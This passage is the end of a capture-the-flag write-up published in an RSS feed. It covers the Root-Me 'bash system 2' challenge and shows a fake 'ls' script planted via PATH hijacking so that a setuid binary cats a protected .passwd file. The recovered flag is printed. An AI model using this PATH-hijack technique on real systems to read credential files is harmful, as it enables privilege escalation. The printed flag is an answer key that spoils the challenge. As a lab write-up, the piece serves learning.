-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
-
-&lt;p&gt;Ok. We have a bash script that mimics the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command disguised as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. Let’s try it out.&lt;/p&gt;
-
-&lt;h3 id=&quot;attempt-1&quot;&gt;Attempt 1&lt;/h3&gt;
-
-&lt;p&gt;If we try to run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary under these circumstances, this is what happens:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nothing. Why?! Here’s what is happening: the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./ch12&lt;/code&gt; is looking for the binary called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, which in this case is a bash script that runs an empty &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. But what happens with the rest of the string in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, you ask? Well, they are treated as command line arguments to our bash script!&lt;/p&gt;
-
-&lt;p&gt;To test this hypothesis, let’s change our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to the following:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;False command: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Arguments: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command runs, it will print out its path and the arguments passed after it. If our hypothesis is correct, when we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; now, it should print the rest of the string as the arguments:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
-False &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: /tmp/cecil/ls
-Arguments: &lt;span class=&quot;nt&quot;&gt;-lA&lt;/span&gt; /challenge/app-script/ch12/.passwd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Amazing! It is in the mistakes that we craft a solution!&lt;/p&gt;
-
-&lt;h3 id=&quot;attempt-2&quot;&gt;Attempt 2&lt;/h3&gt;
-
-&lt;p&gt;Since we got rid of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; flag by making it to be passed as arguments of our fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; script, we can change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to simply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /challenge/app-script/ch12/.passwd&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /challenge/app-script/ch12/.passwd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary again:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
-8a95eDS/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;e_T#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And we get the flag!&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;In this CTF, we dove into another layer of system complexities and the exploitation of C functions. We began by dissecting the core elements presented by the challenge script, progressing towards identifying potential exploitation avenues.&lt;/p&gt;
-
-&lt;p&gt;The strategy was built around the concept of command substitution, made possible by the writable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and by manipulating the $PATH variable. This allowed us to craft a substitute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that redirected the execution flow from the intended &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lA&lt;/code&gt; command to our bash script. By creating a bash script, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command was treated as a executable and the rest of the string as arguments, eliminating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch.&lt;/p&gt;
-
-&lt;p&gt;This was all possible due to the fact we had already tackled a similar problem, and because we tried a failed attempt first. Remember, it is in the failures that we find the solution!&lt;/p&gt;
-
-&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 05 Dec 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000//bash-system-2-root-me</link>
-        <link href="http://localhost:4000/bash-system-2-root-me"/>
-        <guid isPermaLink="true">http://localhost:4000/bash-system-2-root-me</guid>
       </item>
     
   </channel>
